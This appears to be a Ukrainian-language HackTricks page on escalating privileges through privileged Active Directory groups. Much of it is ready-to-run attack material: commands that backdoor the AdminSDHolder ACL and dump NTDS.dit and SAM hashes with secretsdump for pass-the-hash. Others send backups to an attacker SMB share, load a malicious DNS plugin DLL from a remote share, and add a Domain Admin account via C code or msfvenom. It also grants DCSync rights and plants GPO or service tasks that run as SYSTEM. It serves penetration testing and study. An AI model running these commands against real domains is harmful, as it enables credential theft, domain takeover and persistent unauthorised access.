# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дає змогу локально входити до Domain Controller (DC).

Щоб визначити учасників цієї групи, виконується така команда:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавання нових користувачів дозволено, як і локальний вхід до DC.<sup>[[1]](#references)</sup>

## Група AdminSDHolder

Список керування доступом (ACL) групи **AdminSDHolder** має вирішальне значення, оскільки він визначає дозволи для всіх "protected groups" в Active Directory, зокрема для груп із високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder** і надавши стандартному користувачу повні дозволи. Фактично це надасть цьому користувачу повний контроль над усіма protected groups. Якщо дозволи цього користувача буде змінено або видалено, їх буде автоматично відновлено протягом години відповідно до принципу роботи системи.<sup>[[14]](#references)</sup>

В актуальній документації Windows Server кілька вбудованих operator groups досі розглядаються як **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` тощо). Процес **SDProp** за замовчуванням запускається на **PDC Emulator** кожні 60 хвилин, встановлює `adminCount=1` і вимикає успадкування для protected objects. Це корисно як для persistence, так і для пошуку застарілих привілейованих користувачів, яких видалили з protected group, але які все ще мають ACL без успадкування.<sup>[[12]](#references)</sup>

Команди для перегляду учасників і зміни дозволів включають:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Доступний скрипт для пришвидшення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Докладніше див. на [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Кошик AD

Членство в цій групі дає змогу читати видалені об'єкти Active Directory, що може розкрити конфіденційну інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Це корисно для **відновлення попередніх шляхів підвищення привілеїв**. Видалені об’єкти все ще можуть містити `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, старі SPN або DN видаленої привілейованої групи, яку згодом може відновити інший оператор.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Доступ до Domain Controller

Доступ до файлів на DC обмежений, якщо користувач не є учасником групи `Server Operators`, що змінює рівень доступу.

### Ескалація привілеїв

За допомогою `PsService` або `sc` із Sysinternals можна перевіряти та змінювати дозволи служб. Наприклад, група `Server Operators` має повний контроль над певними службами, що дає змогу виконувати довільні команди та здійснювати ескалацію привілеїв:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що `Server Operators` мають повний доступ, що дає змогу маніпулювати службами для отримання підвищених привілеїв.

## Backup Operators

Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` і `SeRestore`. Ці привілеї дають змогу переходити між папками, переглядати їхній вміст і копіювати файли навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати спеціальні скрипти.<sup>[[1]](#references)</sup>

Щоб переглянути учасників групи, виконайте:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Для використання цих привілеїв локально виконуються такі кроки:

1. Імпортуйте необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкніть і перевірте `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Отримання доступу до файлів в обмежених каталогах і їх копіювання, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Прямий доступ до файлової системи Domain Controller дозволяє викрасти базу даних `NTDS.dit`, яка містить усі NTLM hashes користувачів і комп'ютерів домену.

#### Using diskshadow.exe

1. Створіть shadow copy диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` із тіньової копії:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` і `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Після вилучення: Pass-the-Hash до DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Використання wbadmin.exe

1. Налаштуйте файлову систему NTFS для SMB server на attacker machine і кешуйте облікові дані SMB на target machine.
2. Використайте `wbadmin.exe` для системного backup та extraction `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Практичну демонстрацію дивіться у [ДЕМОНСТРАЦІЙНОМУ ВІДЕО ВІД IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Учасники групи **DnsAdmins** можуть скористатися своїми привілеями для завантаження довільної DLL із привілеями SYSTEM на DNS server, який часто розміщений на Domain Controllers. Ця можливість забезпечує значний потенціал для exploitation.

Щоб переглянути учасників групи DnsAdmins, використайте:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Виконання довільної DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дозволяє виконувати довільний код із привілеями SYSTEM у службі DNS (зазвичай усередині DC). Цю проблему було виправлено у 2021 році.

Учасники можуть змусити DNS-сервер завантажити довільну DLL (локально або з віддаленого ресурсу) за допомогою таких команд:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (для цього можуть знадобитися додаткові дозволи) необхідний, щоб DLL було завантажено:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для отримання додаткової інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll

Також можна використовувати mimilib.dll для виконання команд, модифікувавши його для виконання певних команд або reverse shells. [Перегляньте цей допис](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), щоб дізнатися більше.<sup>[[15]](#references)</sup>

### Запис WPAD для MitM

DnsAdmins можуть маніпулювати DNS-записами для виконання атак Man-in-the-Middle (MitM), створивши запис WPAD після вимкнення глобального списку блокування запитів. Для spoofing і захоплення мережевого трафіку можна використовувати такі інструменти, як Responder або Inveigh.

### Event Log Readers
Члени можуть отримувати доступ до журналів подій і потенційно знаходити конфіденційну інформацію, зокрема паролі у відкритому вигляді або відомості про виконання команд:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Windows Permissions в Exchange

Ця група може змінювати DACLs об'єкта домену, потенційно надаючи привілеї DCSync. Техніки підвищення привілеїв із використанням цієї групи детально описані в GitHub-репозиторії Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Якщо ви можете діяти як учасник цієї групи, класичне зловживання полягає в наданні контрольованому атакувальником принципалу прав реплікації, необхідних для [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Історично **PrivExchange** поєднував доступ до поштових скриньок, примусову автентифікацію Exchange і LDAP relay, щоб отримати цей самий примітив. Навіть якщо цей relay-шлях пом’якшено, пряма належність до `Exchange Windows Permissions` або контроль над сервером Exchange все одно залишаються високоризиковим шляхом до прав реплікації домену.

## Hyper-V Administrators

Hyper-V Administrators мають повний доступ до Hyper-V, що можна використати для отримання контролю над віртуалізованими контролерами домену. Це включає клонування активних DC та вилучення NTLM-хешів із файлу NTDS.dit.

### Приклад експлуатації

Практичне зловживання зазвичай полягає в **офлайн-доступі до дисків/checkpoints DC**, а не в старих host-level LPE-трюках. Маючи доступ до Hyper-V host, оператор може створити checkpoint або експортувати віртуалізований контролер домену, підключити VHDX і вилучити `NTDS.dit`, `SYSTEM` та інші секрети, не взаємодіючи з LSASS усередині guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Звідти повторно використайте workflow `Backup Operators`, щоб скопіювати `Windows\NTDS\ntds.dit` і hive-файли реєстру в offline-режимі.

## Group Policy Creators Owners

Ця група дозволяє учасникам створювати Group Policies у домені. Однак її учасники не можуть застосовувати групові політики до користувачів або груп, а також редагувати наявні GPO.

Важливий нюанс полягає в тому, що **creator стає власником нового GPO** і зазвичай отримує достатньо прав для подальшого його редагування. Це означає, що ця група становить інтерес, коли ви можете:

- створити malicious GPO і переконати адміністратора прив'язати його до цільового OU/домену
- редагувати створений вами GPO, який уже прив'язаний у корисному місці
- зловжити іншим делегованим правом, що дозволяє прив'язувати GPO, тоді як ця група надає права на редагування

Практичне зловживання зазвичай передбачає додавання **Immediate Task**, **startup script**, **local admin membership** або зміни **user rights assignment** через файли політик, що зберігаються в SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Якщо ви редагуєте GPO вручну через `SYSVOL`, пам’ятайте, що самої зміни недостатньо: також потрібно оновити `versionNumber`, `GPT.ini`, а іноді й `gPCMachineExtensionNames`, інакше клієнти проігнорують оновлення політики.<sup>[[9]](#references)</sup>

## Керування організацією

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група **Organization Management** має значні можливості. Ця група має привілеї **отримувати доступ до поштових скриньок усіх користувачів домену** та підтримує **повний контроль над** Organizational Unit (OU) **'Microsoft Exchange Security Groups'**. Цей контроль охоплює групу **`Exchange Windows Permissions`**, яку можна використати для підвищення привілеїв.

### Експлуатація привілеїв і команди

#### Print Operators

Члени групи **Print Operators** мають кілька привілеїв, зокрема **`SeLoadDriverPrivilege`**, який дає їм змогу **локально входити до Domain Controller**, вимикати його та керувати принтерами. Для експлуатації цих привілеїв, особливо якщо **`SeLoadDriverPrivilege`** не відображається в неелевованому контексті, необхідно обійти User Account Control (UAC).<sup>[[1]](#references)</sup>

Щоб переглянути членів цієї групи, використовується така команда PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
На Domain Controllers ця група небезпечна, оскільки політика Domain Controller Policy за замовчуванням надає **`SeLoadDriverPrivilege`** групі `Print Operators`. Якщо ви отримаєте підвищений token учасника цієї групи, ви зможете активувати привілей і завантажити підписаний, але вразливий драйвер, щоб отримати доступ до kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Докладніше про роботу з token див. у розділі [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Учасникам цієї групи надається доступ до ПК через Remote Desktop Protocol (RDP). Для перерахування цих учасників доступні команди PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості про експлуатацію RDP можна знайти у спеціалізованих ресурсах з pentesting.

#### Користувачі віддаленого керування

Члени групи можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування цих членів виконується за допомогою:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Щодо технік exploitation, пов’язаних із **WinRM**, слід звернутися до відповідної документації.

#### Server Operators

Ця група має дозволи на виконання різних конфігурацій на контролерах домену, зокрема привілеї резервного копіювання та відновлення, зміну системного часу й вимкнення системи.<sup>[[1]](#references)</sup> Для перерахування її учасників використовується така команда:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
На Domain Controllers учасники групи `Server Operators` зазвичай успадковують достатні права для **переналаштування або запуску/зупинки служб**, а також отримують `SeBackupPrivilege`/`SeRestorePrivilege` через політику DC за замовчуванням. На практиці це робить їх мостом між **зловживанням керуванням службами** та **вилученням NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Якщо ACL служби надає цій групі права на зміну/запуск, вкажіть для служби довільну команду, запустіть її від імені `LocalSystem`, а потім відновіть початковий `binPath`. Якщо керування службами обмежене, скористайтеся наведеними вище техніками `Backup Operators`, щоб скопіювати `NTDS.dit`.

## Посилання

- [1] [ired.team – Привілейовані облікові записи та привілеї токенів](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Зловживання SeLoadDriverPrivilege для підвищення привілеїв](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Зловживання дозволами GPO](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Зловживання GPO — частина 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Посібник Red Teamer щодо GPO та OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – Функція NtLoadDriver](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Анонімний LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Додаток C: Захищені облікові записи та групи в Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Як зловживати AdminSDHolder і створити в ньому backdoor для отримання persistence Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Зловживання привілеєм DnsAdmins для підвищення прав в Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
